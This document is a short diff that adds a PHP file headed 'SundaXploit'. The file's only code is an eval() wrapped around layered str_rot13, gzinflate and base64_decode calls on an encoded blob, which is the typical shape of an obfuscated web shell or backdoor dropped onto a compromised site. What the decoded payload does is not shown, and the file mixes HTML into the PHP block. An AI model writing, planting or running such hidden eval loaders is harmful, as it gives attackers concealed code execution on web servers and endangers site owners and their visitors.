@@ -1,0 +1,3 @@
+<?php
+<h1>SundaXploit</h1>
+eval(str_rot13(gzinflate(str_rot13(base64_decode("LclYCoAgFAXQvTjSiQ8aFtRFUSOfFZhcP6Crr06zAwd07EV5q9C5aJgCNslMhnIvUnLe/VlnxFiXxjU8weP4Xyc3KMeEAYB8Uu80b7MfJ803C6WWFw=="))))); 
